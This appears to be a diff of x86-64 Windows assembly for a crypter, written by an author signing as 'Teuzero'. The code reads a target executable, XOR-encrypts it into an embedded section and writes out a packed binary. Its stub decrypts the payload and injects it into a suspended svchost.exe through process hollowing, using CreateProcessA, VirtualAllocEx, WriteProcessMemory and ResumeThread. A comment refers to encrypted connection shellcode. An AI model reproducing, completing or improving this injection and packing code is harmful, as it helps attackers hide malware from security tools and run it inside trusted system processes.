@@ -4,109 +4,89 @@
 ;**************
 global WinMain
 
-section .BSS
-    bool dq 1
-    tamArq dq 0
-
-section .data
-    process dq "svchost.exe",0,0
-
-    struc CONTEXT
-       .P1Home:                                      resq 1
-       .P2Home:                                      resq 1
-       .P3Home:                                      resq 1
-       .P4Home:                                      resq 1
-       .P5Home:                                      resq 1
-       .P6Home:                                      resq 1
-       .ContextFlags:                                resd 1
-       .MxCsr:                                       resd 1
-       .SegCs:                                       resw 1
-       .SegDs:                                       resw 1
-       .SegEs:                                       resw 1
-       .SegFs:                                       resw 1
-       .SegGs:                                       resw 1
-       .SegSs:                                       resw 1
-       .EFlags:                                      resd 1
-       .Dr0:                                         resq 1
-       .Dr1:                                         resq 1
-       .Dr2:                                         resq 1
-       .Dr3:                                         resq 1
-       .Dr6:                                         resq 1
-       .Dr7:                                         resq 1
-       .Rax:                                         resq 1
-       .Rcx:                                         resq 1
-       .Rdx:                                         resq 1
-       .Rbx:                                         resq 1
-       .Rsp:                                         resq 1
-       .Rbp:                                         resq 1
-       .Rsi:                                         resq 1
-       .Rdi:                                         resq 1
-       .R8:                                          resq 1
-       .R9:                                          resq 1
-       .R10:                                         resq 1
-       .R11:                                         resq 1
-       .R12:                                         resq 1
-       .R13:                                         resq 1
-       .R14:                                         resq 1
-       .R15:                                         resq 1
-       .Rip:                                         resq 1
+section .bss
+	tm                                              resq 8
+	tamTotal                                        resq 8
+	NameArgv0                                       resb 32
+	AddressAlocadoV resq 8
+	addressAllocTarget                              resq 8
+	addressAllocArv0                                resq 8
+	addressCrypted                                  resq 8
+    TamArqProgram                                   resq 8
+    TamArqTarget                                    resq 8
+    bufferFileName                                  resq 32
+	bufferFileNameTarget                            resq 32
+    GetSizeTarget                                   resq 8
+    lpPebImageBase                                  resq 8
+    allocex                                         resq 8
+    alloc                                           resq 8
+    lpImageBase                                     resq 16
+    VA                                              resq 8
+    PE                                              resq 16
+    ImageBase                                       resq 16
+    NumSecion                                       resq 8
+    Ptrt                                            resq 8
+    void                                            resq 8
+    address750                                      resq 8
+	NumSection resq 8
+	handle resq 8
+	BufferFileNameTarget resq 0x100
+	
+	struc CONTEXT
+       .P1Home:                                     resq 1
+       .P2Home:                                     resq 1
+       .P3Home:                                     resq 1
+       .P4Home:                                     resq 1
+       .P5Home:                                     resq 1
+       .P6Home:                                     resq 1
+       .ContextFlags:                               resd 1
+       .MxCsr:                                      resd 1
+       .SegCs:                                      resw 1
+       .SegDs:                                      resw 1
+       .SegEs:                                      resw 1
+       .SegFs:                                      resw 1
+       .SegGs:                                      resw 1
+       .SegSs:                                      resw 1
+       .EFlags:                                     resd 1
+       .Dr0:                                        resq 1
+       .Dr1:                                        resq 1
+       .Dr2:                                        resq 1
+       .Dr3:                                        resq 1
+       .Dr6:                                        resq 1
+       .Dr7:                                        resq 1
+       .Rax:                                        resq 1
+       .Rcx:                                        resq 1
+       .Rdx:                                        resq 1
+       .Rbx:                                        resq 1
+       .Rsp:                                        resq 1
+       .Rbp:                                        resq 1
+       .Rsi:                                        resq 1
+       .Rdi:                                        resq 1
+       .R8:                                         resq 1
+       .R9:                                         resq 1
+       .R10:                                        resq 1
+       .R11:                                        resq 1
+       .R12:                                        resq 1
+       .R13:                                        resq 1
+       .R14:                                        resq 1
+       .R15:                                        resq 1
+       .Rip:                                        resq 1
     endstruc
-
-    ctx istruc CONTEXT 
-       at CONTEXT.P1Home,                            dq 0
-       at CONTEXT.P2Home,                            dq 0
-       at CONTEXT.P3Home,                            dq 0
-       at CONTEXT.P4Home,                            dq 0
-       at CONTEXT.P5Home,                            dq 0
-       at CONTEXT.P6Home,                            dq 0
-       at CONTEXT.ContextFlags,                      dd 0
-       at CONTEXT.MxCsr,                             dd 0
-       at CONTEXT.SegCs,                             dw 0
-       at CONTEXT.SegDs,                             dw 0
-       at CONTEXT.SegEs,                             dw 0
-       at CONTEXT.SegFs,                             dw 0
-       at CONTEXT.SegGs,                             dw 0
-       at CONTEXT.SegSs,                             dw 0
-       at CONTEXT.EFlags,                            dd 0
-       at CONTEXT.Dr0,                               dq 0
-       at CONTEXT.Dr1,                               dq 0
-       at CONTEXT.Dr2,                               dq 0
-       at CONTEXT.Dr3,                               dq 0
-       at CONTEXT.Dr6,                               dq 0
-       at CONTEXT.Dr7,                               dq 0
-       at CONTEXT.Rax,                               dq 0
-       at CONTEXT.Rcx,                               dq 0
-       at CONTEXT.Rdx,                               dq 0
-       at CONTEXT.Rbx,                               dq 0
-       at CONTEXT.Rsp,                               dq 0
-       at CONTEXT.Rbp,                               dq 0
-       at CONTEXT.Rsi,                               dq 0
-       at CONTEXT.Rdi,                               dq 0
-       at CONTEXT.R8,                                dq 0
-       at CONTEXT.R9,                                dq 0
-       at CONTEXT.R10,                               dq 0
-       at CONTEXT.R11,                               dq 0
-       at CONTEXT.R12,                               dq 0
-       at CONTEXT.R13,                               dq 0
-       at CONTEXT.R14,                               dq 0
-       at CONTEXT.R15,                               dq 0
-       at CONTEXT.Rip,                               dq 0
-    iend
-     
+	
+   struc PROCESSINFO
+        .hProcess                                   resd 2
+        .hThread                                    resd 2
+        .dwProcessId                                resd 1
+        .dwThreadId                                 resd 1
+    endstruc
+	     
    struc PROCESSINFO
         .hProcess                                    resd 2
         .hThread                                     resd 2
         .dwProcessId                                 resd 1
         .dwThreadId                                  resd 1
     endstruc
-
-    ProcInfo istruc PROCESSINFO
-        at PROCESSINFO.hProcess,                     dd 0
-        at PROCESSINFO.hThread,                      dd 0
-        at PROCESSINFO.dwProcessId,                  dw 0
-        at PROCESSINFO.dwThreadId,                   dw 0
-    iend
-
+		
     struc STARTUPINFOA 
         .cb                                          resd 1
         .lpReserved                                  resb 8
@@ -127,59 +107,239 @@ section .data
         .hStadOutput                                 resd 2
         .hStdError                                   resd 2
     endstruc
-    startup istruc STARTUPINFOA 
-       at STARTUPINFOA.cb,                           dd 0
-       at STARTUPINFOA.lpReserved,                   db 0
-       at STARTUPINFOA.lpDesktop,                    db 0
-       at STARTUPINFOA.lpTitle,                      db 0
-       at STARTUPINFOA.dwX,                          dd 0
-       at STARTUPINFOA.dwY,                          dd 0
-       at STARTUPINFOA.dwXSize,                      dd 0
-       at STARTUPINFOA.dwYSize,                      dd 0
-       at STARTUPINFOA.dwXCountChars,                dd 0
-       at STARTUPINFOA.dwYCountChars,                dd 0
-       at STARTUPINFOA.dwFillAttribute,              dd 0
-       at STARTUPINFOA.dwFlags,                      dd 0
-       at STARTUPINFOA.wShowWindow,                  dw 0
-       at STARTUPINFOA.cbReserved2,                  dw 0
-       at STARTUPINFOA.lpReserverd2,                 db 0
-       at STARTUPINFOA.hStdInput,                    dd 0
-       at STARTUPINFOA.hStadOutput,                  dd 0
-       at STARTUPINFOA.hStdError,                    dd 0
-    iend  
 
-    addressAlloc times 8                             dq 0
-    TamArqProgram times 8                            dq 0
-    TamArqTarget times 8                             dq 0
-    bufferFileName times 32                          db 0
-    GetSizeTarget times 8                            dq 0
-    lpPebImageBase times 8                           dq 0
-    allocex times 8                                  dd 0 
-    alloc times 8                                    dd 0
-    lpImageBase times 8                              dd 0
-    VA times 8                                       dd 0
-    PE times 8                                       dq 0
-    ImageBase times 16                               dq 0
-    NumSecion times 8                                db 0
-    Ptrt times 8                                     dq 0
-    void times 8                                     dq 0
-    NumSection times 8                               dq 0
-    address750 times 8                               dq 0
+section .rdata
+	Ptrl                                             dq  0x0004000000000000
+	process dq "svchost.exe",0,0
+
+section .data
+
+	ctx istruc CONTEXT
+    iend
+
+    ProcInfo istruc PROCESSINFO
+    iend
+   
+   startup istruc STARTUPINFOA 
+    iend 
+	
     pt20                                             dq 20
     Ptrt0                                            dq 0x00
     ptr17f0                                          dd 0x01
     address7ec                                       dd 0
-    Ptrl                                             dq  0x0004000000000000
-    NameArgv0 times 32 db 0
-    tm times 8 dq 0
+	bool dq 1
+    tamArq dq 0
+	
+section codered
+	CodeRed:
+	buffer times 800000 dq 0
 
-section .codered 
- CodeRed times 800000                             db 0:
+section .text
+WinMain:
+    Start:
+    ;***************
+    ;**** START ****
+    ;***************
+    ;* By: Teuzero *
+    ;***************
 
-section .deccode    
+    ;Obtem o endereço base do kernel32.dll 
+    call Locate_kernel32
+    call IAT
+    call FinFunctionGetProcAddress
+    call LoadLibraryA
+    call LoadMsvcrt
+    call PrintMsgConsole
+    call PegaNomeDoaquivo
+    
+	lea rax, [rsp+0x10]
+    mov [bufferFileNameTarget], rax
+    
+	call ReadTarget
+    call Locate_kernel32
+	
+	call VirtualProect
+	;CALL VirtualProtect 
+    mov r10, [TamArqTarget]
+    add r10, 0x77
+    sub rsp, 0x30
+    push rsp
+    mov r9, rsp
+    mov r8d, 0x40
+    mov rdx, r10
+    mov ecx, CodeRed
+    sub rsp, 0x30
+    call rsi
+    add rsp, 0x30
+	
+    mov rdx,[TamArqTarget]
+	mov rdi, [addressAllocTarget]
+	mov rsi, CodeRed
+    xor rcx,rcx
+    Encrypt:
+        mov rbx, [rdi]
+        add rbx, 0xc
+        xor rbx, 0xC0FFEE
+        mov [rsi], rbx
+		inc rdi
+		inc rsi
+        dec rdx
+        cmp rdx,rcx
+        jne Encrypt 
+    
+	mov rbx, "T007.exe"
+	push rbx
+	mov [rsp+0x8], byte 0x00
+	lea rbx, [rsp]
+	mov [bufferFileName], rbx
+	call OpenFileArg0
+
+	;Lookup malloc
+    mov rdi, "malloc"
+    push rdi
+    lea rdx, [rsp]
+    mov rcx, r15
+    sub rsp, 0x30
+    call r14
+    add rsp, 0x30
+
+    ;call malloc
+    mov rcx, [TamArqProgram]
+    sub rsp, 0x30
+    call rax
+    mov [addressCrypted], rax
+    mov rdi, rax
+    add rsp,0x30
+    add rsp, 0x08
+	
+	
+	mov rcx, [TamArqProgram]
+	mov rdx, [addressCrypted]
+	mov rdi, [addressAllocArv0]
+
+	Copy:
+		mov rsi, [rdi]
+		mov [rdx], rsi
+		inc rdi
+		inc rdx
+		dec rcx
+		cmp rcx, 0x00
+		jne Copy
+	
+	mov rdx, [addressCrypted]
+	mov rdi, CodeRed
+	add rdx, 0x400 
+	
+	mov rcx, [TamArqTarget]
+	CopyTarget:
+		mov rsi, [rdi]
+		mov [rdx],rsi
+		inc rdi
+		inc rdx
+		dec rcx
+		cmp rcx, 0x00
+		jne CopyTarget
+	
+	WriterCrypted:
+		;Lookup fopen
+        mov rax, "fopen"
+        push rax
+        lea rdx, [rsp]
+        mov rcx, r15
+        sub rsp, 0x30
+        call r14
+        add rsp, 0x30
+        add rsp, 0x08
+
+        ;Abre arquivo
+        mov rbx, "Tx0.exe"
+        push rbx
+        lea rcx, [rsp]
+        mov rbx, "wb+"
+        push rbx
+        lea rdx, [rsp]
+        sub rsp, 0x30
+        call rax
+		mov rsi, rax
+		add rsp, 0x30
+		
+		;Lookup fwrite
+        mov rax, "fwrite"
+        push rax
+        lea rdx, [rsp]
+        mov rcx, r15
+        sub rsp, 0x30
+        call r14
+		add rsp, 0x30
+		add rsp, 0x08
+		
+		mov rbx, [addressCrypted]
+		mov edx, dword [rbx+0x3c]
+		add rbx, rdx
+		add rbx, 0x28
+		mov [rbx], dword 0x0061D000
+		
+        ;call fwrite
+        xor r8,R8
+        mov r8, [TamArqProgram]
+        mov edx, r8d
+        mov r9, rsi
+        mov r8d, 0x01
+        mov rcx, [addressCrypted]
+        sub rsp, 0x30
+        call rax
+        add rsp, 0x30
+        add rsp, 0x08
+        ;Lookup fclose
+        mov rax, "fclose"
+        push rax
+        lea rdx, [rsp]
+        mov rcx, r15
+        sub rsp, 0x30
+        call r14
+        add rsp, 0x30
+        add rsp, 0x08
+		
+		;call fclose
+		sub rsp,0x30
+		mov rcx, rsi
+		call r12
+		add rsp, 0x30
+		add rsp, 0x08
+	
+	dec:
+        ;call decCode
+    
+	Exit:   
+        call Locate_kernel32
+        ;lookup ExitProcess
+        mov rax, "ess"
+        push rax
+        mov rax, "ExitProc"
+        push rax
+        lea rdx, [rsp]
+        mov rcx, r8
+        sub rsp, 0x30
+        call r14
+        add rsp, 0x30
+        add rsp, 0x10
+        ;call ExitProcess
+        mov r12 ,rax
+        call r12
+    ;END
+ret
+;***************
+;*     AND     *
+;***************
+
+section deccode    
     decCode:
+	call Locate_kernel32
+    call IAT
+    call FinFunctionGetProcAddress
     ;SHELLCODE DE CONEXÃO ENCRIPTADO
-    call Locate_kernel32    
+     
+	call Locate_kernel32	 
     ;Lookup CreateProcessA
     mov rax, 0x41737365636f
     push rax
@@ -189,10 +349,11 @@ section .deccode
     mov rcx, r8
     sub rsp, 0x30
     call R14
-    mov r12, rax
     add rsp, 0x30
     add rsp, 0x10
-    sub rsp, 0x238
+	
+	sub rsp, 0x238
+
     ;Call CreateProcessA, CRIA PROCESSO SVCHOST SUSPENSO
     lea rdx,[ProcInfo+PROCESSINFO.hProcess]
     mov [rsp+0x48], rdx
@@ -214,11 +375,12 @@ section .deccode
     lea rdx, [process]
     mov ecx, 0
     xor r10,r10
-    call r12
-    add rsp, 0x238
-        
+    call rax
+	add rsp, 0x238
+	
     call Locate_kernel32
     call GetProcAddres
+	
 
     ;Lookup VirtualAlloc
     mov rax, "lloc"
@@ -230,58 +392,44 @@ section .deccode
     sub rsp, 0x30
     sub rsp, 0x10
     call r14
-    mov r12,rax
+   
     add rsp, 0x30
     add rsp, 0x10
     ;call VirtualAlloc
     mov r9d, 0x04
     mov r8d, 0x1000
-    mov rdi, 0xC3500
+    mov rdi, 0x80000
     mov edx, edi
     mov ecx, 0x00
-    call r12
-    add rsp, 0x10
-    mov rbx,rax
-    mov rdi, rbx
-    mov [alloc], rax
-    mov rax, CodeRed
-    xor rcx,rcx
-    mov r9, [TamArqTarget]
-    mov [tm], r9
-    cmp r9, 0x00
-    jnz DecArq
-    mov r9, [tamArq]
+    call rax
+	mov [AddressAlocadoV], rax
+    mov rcx, [AddressAlocadoV]
+	mov rdx, CodeRed
+    mov r9, 0x80000
+	sub r9, 0x07
     DecArq:
-        mov rdx, [rax]
-        xor rdx, 0xC0FFEE
-        sub rdx, 0xc
-        mov [rbx],rdx
-        inc rbx
-        inc rax
-        inc RCX
-        cmp rcx, r9
+        mov rax, [rdx]
+        xor rax, 0xC0FFEE
+        sub rax, 0xc
+        mov [rcx],rax
+        inc rcx
+        inc rdx
+        dec r9
+        cmp r9, 0x00
         jne DecArq
-    mov rcx, [alloc]
-    mov rax, [alloc]
-    add rax, 0x3C
-    xor rbx,RBX
-    mov ebx, [eax]
-    mov rax, RCX
+
+    mov rax, [AddressAlocadoV]
+    mov ebx,  dword[rax+0x3C]
     add rax, rbx
     add rax, 0x50
     mov ebx, [eax]
     mov [GetSizeTarget],ebx
-    mov [lpImageBase], rcx
-    mov rax, [lpImageBase]
-    mov rcx, [lpImageBase]
-    xor rdi,rdi
-    add rax, 0x3c
-    mov edi, [eax]
-    mov rax, rcx
+	mov rax, [AddressAlocadoV]
+    mov [lpImageBase], rax 
+    mov edi, dword [rax+0x3c]
     add eax, edi
     mov [PE], rax
     add rax, 0x30
-    xor rdi,Rdi
     mov rdi, [rax]
     mov [ImageBase], rdi
     call Locate_kernel32
@@ -296,10 +444,10 @@ section .deccode
     ;Lookup ReadProcessMemory
     call ReadProcessMemory
     ;call ReadProcessMemory
-    mov rax, [ctx+CONTEXT.Rdx]
+	mov rdi, [ctx+CONTEXT.Rdx]
     mov edx, 0x10
-    add rax,rdx
-    mov [void], rax
+    add rdi,rdx
+    mov [void], rdi
     mov rdx, [void]
     lea rcx, [lpPebImageBase]
     xor rdi,rdi
@@ -307,14 +455,12 @@ section .deccode
     mov r9d, 0x08
     mov r8, Rcx
     mov rcx,[ProcInfo+PROCESSINFO.hProcess]
-    call r12
+    call rax
+	
     mov rax, [lpImageBase]
-    mov rcx, [lpImageBase]
-    xor rdi,rdi
-    add rax, 0x3c
-    mov edi, [eax]
-    mov rax, rcx
-    add eax, edi
+    xor rdi,rdi 
+    mov edi, dword [rax+0x3c]
+    add rax, rdi
     mov [PE], rax
     add rax, 0x38
     xor rdi, rdi
@@ -364,16 +510,15 @@ section .deccode
             ;Lookup VirtualAllocEx
             call VirtualAllocEx
             ;call VirtualAllocEx
-            mov rax, [PE]
-            mov eax, dword[rax+0x50]
-            mov ecx,eax
+            mov rbx, [PE]
+            mov ecx, dword[rbx+0x50]
             mov rdx, [ImageBase]
-            mov r8d, [GetSizeTarget]
+            mov r8d, ecx
             mov r9d, 0x3000
             mov [rsp+0x20], dword 0x40
             mov rcx, [ProcInfo+PROCESSINFO.hProcess]
             mov rdi, r13
-            call r12
+            call rax
             mov [allocex],rax
             mov rax, [allocex]
             test rax,Rax
@@ -386,6 +531,7 @@ section .deccode
             je Decisao1
             call Locate_kernel32 
             sub rsp, 0x80
+			
             ;Lookup WriteProcess
             call WriteProcess
             lea r8, [allocex]
@@ -394,8 +540,9 @@ section .deccode
             mov [rsp+0x20], Rcx
             mov r9d, 8
             mov rcx, [ProcInfo+PROCESSINFO.hProcess]
-            call r12
+            call rax
             add rsp, 0x80
+			
             Decisao1:
             mov rax, [PE]
             mov word[rax+0x5C], 2 ;Subsystem
@@ -455,30 +602,30 @@ section .deccode
             mov rcx, Rax
             call r12
             call Locate_kernel32
+			
             ;Lookup WriteProcess
             call WriteProcess
             ;call WriteProcessMemory
             sub rsp, 0x80
-            mov rax, [PE]
-            mov eax, dword[rax+0x54]
-            mov r9d,eax
+            mov rbx, [PE]  
+            mov r9d,dword[rbx+0x54]
             mov r8, [lpImageBase]
             mov rdx, [ImageBase]
             xor rbx,Rbx
             push rbx
             mov [rsp+0x20],rsp
             mov rcx, [ProcInfo+PROCESSINFO.hProcess]
-            call r12
+            call rax
             add rsp, 0x80
             mov rbp, rax
             add rsp, 0x08
             call Locate_kernel32
+			
             ;Lookup VirtualProectEx
             sub rsp, 0x80
             call VirtualProectEx
-            mov rax, [PE]
-            mov eax, dword[rax+0x54]
-            mov r8d, eax
+            mov rbx, [PE]
+            mov r8d, dword[rbx+0x54]
             mov rdx, [ImageBase]
             push Rcx
             mov rcx,rsp
@@ -498,8 +645,9 @@ section .deccode
             mov [NumSection], dword 0x00
             jmp Final
         Delta:
+			add rsp, 0x10
+			
             call Locate_kernel32
-            sub rsp, 0x80
             ;Lookup WriteProcess
             call WriteProcess
             ;call WriteProcess
@@ -547,8 +695,11 @@ section .deccode
             mov [rsp+0x20],rdx
             mov rdx,Rcx
             mov rcx, Rax
+			
+			sub rsp, 0x410
             call R12
-            add rsp, 0x80
+			add rsp, 0x410
+	
             mov dword[ptr17f0], 0
             mov rax, [PE]
             movzx eax, word[rax+0x6]
@@ -699,6 +850,8 @@ section .deccode
         mov rcx, Rax
         call r12
         add rsp, 0x80
+		sub rsp, 0x10
+		add rsp, 0x8
         add dword [NumSection], 0x1
     Final:
         mov rax, [PE]
@@ -706,10 +859,7 @@ section .deccode
         movzx eax, ax
         cmp eax, [NumSection]   
         jg Delta
-        xor rbx,Rbx
-        mov bx, 0x08
-        mul bx
-        add rsp, rax
+		
         call Locate_kernel32 
         ;Lookup ResumeTheread
         mov rax, "read"
@@ -727,205 +877,17 @@ section .deccode
         mov rax, [ProcInfo+PROCESSINFO.hThread]
         mov rcx, rax
         call R12
-        mov rax, [bool]
-        cmp rax, 0
-        jle Exit
-        call Locate_kernel32
-        call LoadLibraryA
-        call LoadMsvcrt 
-        sub rsp, 0x20
-        mov rax, "T007.exe"
-        push Rax
-        mov [rsp+0x8], byte 0x00
-        mov [bufferFileName], rsp
-        call OpenFile
-        add rsp, 0x20
-        call Locate_kernel32
-        call LoadLibraryA
-        call LoadMsvcrt 
-        add rsp, 0x08
-        ;Lookup fopen
-        mov rax, "fopen"
-        push rax
-        lea rdx, [rsp]
-        mov rcx, r15
-        sub rsp, 0x30
-        call r14
-        mov r12,rax
-        add rsp, 0x30
-        add rsp, 0x08
-
-        ;Abre arquivo
-        mov rax, "Tx0.exe"
-        push rax
-        lea rcx, [rsp]
-        mov rax, "wb+"
-        push rax
-        lea rdx, [rsp]
-        sub rsp, 0x30
-        call r12
-        add rsp, 0x30
-        add rsp, 0x10
-        mov rbp,rax
-        ;Lookup fwrite
-        mov rax, "fwrite"
-        push rax
-        lea rdx, [rsp]
-        mov rcx, r15
-        sub rsp, 0x30
-        call r14
-        mov r12, rax
-        add rsp, 0x30
-        mov rax, [addressAlloc]
-        add rax, 0x400
-        mov [rax], byte 0x00
-        sub rax, 0x400
-        add rax, 0xC3C00
-        add rax, 0x36
-        mov [rax], dword 0x240
-        sub rax, 0x36
-        add rax, 0xA7
-        mov [rax], dword 0x240
-        sub rax, 0xA7
-        sub rax, 0xC3C00
-        add rax, 0x400
-        add rax, 0x08
-        xor rdx,Rdx
-        mov rdx, [tm]
-        mov [rax],dword  edx
-        sub rax, 0x400
-        sub rax, 0x08
-        mov rax, [addressAlloc]
-        add rax, 0x600
-        xor rbx, Rbx
-        mov rbx, CodeRed
-        xor rcx,rcx
-        xor r11, r11
-        mov r9, [TamArqTarget]
-        DecArqq:
-            mov r11, [rbx]
-            mov [rax],r11
-            inc r11
-            inc rbx
-            inc rax
-            dec r9
-            cmp rcx, r9
-            jne DecArqq
-        mov rax, [addressAlloc]
-        ;call fwrite
-        xor r8,R8
-        mov r8, [TamArqProgram]
-        mov edx, r8d
-        mov r9, rbp
-        mov r8d, 0x01
-        mov rcx, rax
-        sub rsp, 0x30
-        call r12
-        add rsp, 0x30
-        add rsp, 0x08
-        ;Lookup fclose
-        mov rax, "fclose"
-        push rax
-        lea rdx, [rsp]
-        mov rcx, r15
-        sub rsp, 0x30
-        call r14
-        mov r12, rax
-        add rsp, 0x30
-        add rsp, 0x08
-
-        ;call fclose
-        sub rsp,0x30
-        mov rcx, rbp
-        call r12
-        add rsp, 0x30
+		add rsp, 0x10
+		
 ret         
 
-section .text
-WinMain:
-    Start:
-    ;***************
-    ;**** START ****
-    ;***************
-    ;* By: Teuzero *
-    ;***************
-    ;add rsp, 0xfffffffffffffdf8; # Bytes Vazios
 
-    ;Obtem o endereço base do kernel32.dll 
-    call Locate_kernel32
-    call IAT
-    call FinFunctionGetProcAddress
-    call LoadLibraryA
-    call LoadMsvcrt
-    mov rax, [bool]
-    cmp rax, 0x1
-    jnz dec
-    call PrintMsgConsole
-    call PegaNomeDoaquivo
-    lea rax, [rsp+0x10]
-    mov [bufferFileName], rax
-    call OpenFile
-    mov rbp,[addressAlloc]
-    mov r10, rbp ; Arquivo alvo
-    mov rax, [TamArqProgram]
-    mov [TamArqTarget], rax
-    xor r10,r10
-    call Locate_kernel32
-    call VirtualProect
-    ;CALL VirtualProtect 
-    mov r10, [TamArqTarget]
-    add r10, 0x77
-    sub rsp, 0x30
-    push rsp
-    mov r9, rsp
-    mov r8d, 0x40
-    mov rdx, r10
-    mov ecx, CodeRed
-    sub rsp, 0x30
-    call rsi
-    add rsp, 0x30
 
-    mov ecx, 0
-    mov rax, CodeRed
-    mov rdx,[TamArqTarget]
-    xor rcx,rcx
-    WriteSecion:
-        mov rbx, [rbp]
-        add rbx, 0xc
-        xor rbx, 0xC0FFEE
-        mov [rax], rbx
-        inc rax
-        inc rbp
-        dec rdx
-        cmp rcx,rdx
-        jne WriteSecion 
-    dec:
-        call decCode
-    Exit:   
-        call Locate_kernel32
-        ;lookup ExitProcess
-        mov rax, "ess"
-        push rax
-        mov rax, "ExitProc"
-        push rax
-        lea rdx, [rsp]
-        mov rcx, r8
-        sub rsp, 0x30
-        call r14
-        add rsp, 0x30
-        add rsp, 0x10
-        ;call ExitProcess
-        mov r12 ,rax
-        call r12
-    ;END
-ret
-;***************
-;*     AND     *
-;***************
+
 PrintMsgConsole:
     ;Lookup printf
-    mov rax, "printf"
-    push rax
+    mov rdi, "printf"
+    push rdi
     mov rdx, rsp
     mov rcx, r15
     sub rsp, 0x30
@@ -935,21 +897,21 @@ PrintMsgConsole:
     mov r12, rax
 
     ;call printf
-    mov rax, ":"
-    push rax
-    mov rax, "[+] File"
-    push rax
+    mov rdi, ":"
+    push rdi
+    mov rdi, "[+] File"
+    push rdi
     lea rcx, [rsp]
     sub rsp, 0x30
-    call r12
+    call rax
     add rsp, 0x30
     add rsp, 0x10
 retn
 
 PegaNomeDoaquivo:
     ;Lookup scanf
-    mov rax, "scanf"
-    push rax
+    mov rdi, "scanf"
+    push rdi
     mov rdx,rsp
     mov rcx, r15
     sub rsp, 0x30
@@ -958,19 +920,161 @@ PegaNomeDoaquivo:
     add rsp, 0x30
 
     ;call scanf
-    lea rax, [rsp+0x20]
-    mov rdx, rax
-    mov rax, "%s"
-    push rax
+    lea rdi, [rsp+0x20]
+    mov rdx, rdi
+    mov rbx, "%s"
+    push rbx
     lea rcx, [rsp]
     sub rsp, 0x30
-    call r12
+    call rax
     add rsp, 0x30
     add rsp, 0x10
 ret
 
-OpenFile:
-    ;Lookup fopen
+ReadTarget:
+ ;Lookup fopen
+    mov rax, "fopen"
+    push rax
+    lea rdx, [rsp]
+    mov rcx, r15
+    sub rsp, 0x30
+    call r14
+    mov r12,rax
+    add rsp, 0x30
+
+    ;Abre arquivo
+    mov rax, [bufferFileNameTarget]
+    lea rcx, [rax]
+    mov rax, "rb"
+    push rax
+    lea rdx, [rsp]
+    sub rsp, 0x30
+    call r12
+    add rsp, 0x30
+    mov rbx,rax
+    add rsp, 0x10
+
+LocomoveParaOFimDoarquivoTarget:
+    ;Lookup fseek
+    mov rax, "fseek"
+    push rax
+    lea rdx, [rsp]
+    mov rcx, r15
+    sub rsp, 0x30
+    call r14
+    mov r12,rax
+    add rsp, 0x30
+
+    ;call fseek
+    mov rcx, rbx
+    mov r8d, dword 0x02        
+    mov edx, dword 0x00
+    sub rsp, 0x30
+    call r12
+    add rsp, 0x30
+    add rsp, 0x08
+GetSizeFileTarget:
+    ;Lookup ftell
+    mov rax, "ftell"
+    push rax
+    lea rdx, [rsp]
+    mov rcx, r15
+    sub rsp, 0x30
+    call r14
+    add rsp, 0x30
+    mov r12,rax
+
+    ;call ftell
+    mov rcx, rbx
+    sub rsp, 0x30
+    call r12
+    mov [TamArqTarget], rax
+    add rsp,0x30
+    mov rsi,rax
+    add rsp, 0x08
+
+AlocaEspacoEmUmEnderecoTarget:
+    ;Lookup malloc
+    mov rax, "malloc"
+    push rax
+    lea rdx, [rsp]
+    mov rcx, r15
+    sub rsp, 0x30
+    call r14
+    mov r12,rax
+    add rsp, 0x30
+
+    ;call malloc
+    mov rcx, rsi
+    sub rsp, 0x30
+    call r12
+    mov [addressAllocTarget], rax
+    mov rdi, rax
+    add rsp,0x30
+    add rsp, 0x08
+
+MoveParaInicioDoArquivoTarget:
+    ;Lookup rewind
+    mov rax, "rewind"
+    push rax
+    lea rdx, [rsp]
+    mov rcx, r15
+    sub rsp, 0x30
+    call r14
+    mov r12, rax
+    add rsp, 0x30
+
+    ;call rewind
+    mov rcx, rbx
+    sub rsp, 0x30
+    call r12
+    add rsp, 0x30
+    add rsp, 0x08
+
+GravaOPEdoArquivoNoEnderecoAlocadoPorMallocTarget:
+    ;Lookup fread
+    mov rax, "fread"
+    push rax
+    lea rdx, [rsp]
+    mov rcx, r15
+    sub rsp, 0x30
+    call r14
+    mov r12, rax
+    add rsp, 0x30
+
+    ;call fread
+    mov edx,esi
+    mov r9, rbx
+    mov r8d, 0x01
+    mov rcx, rdi
+    sub rsp, 0x30
+    call r12
+    add rsp, 0x30
+    add rsp, 0x08
+
+FechaArquivoTarget:
+    ;Lookup fclose
+    mov rax, "fclose"
+    push rax
+    lea rdx, [rsp]
+    mov rcx, r15
+    sub rsp, 0x30
+    call r14
+    mov r12, rax
+    add rsp, 0x30
+
+    ;call fclose
+    sub rsp,0x30
+    mov rcx, rbx
+    call r12
+    add rsp, 0x30
+    add rsp, 0x08
+ ret
+ 
+ 
+ 
+ OpenFileArg0:
+   ;Lookup fopen
     mov rax, "fopen"
     push rax
     lea rdx, [rsp]
@@ -1046,7 +1150,7 @@ AlocaEspacoEmUmEndereco:
     mov rcx, rsi
     sub rsp, 0x30
     call r12
-    mov [addressAlloc], rax
+    mov [addressAllocArv0], rax
     mov rdi, rax
     add rsp,0x30
     add rsp, 0x08
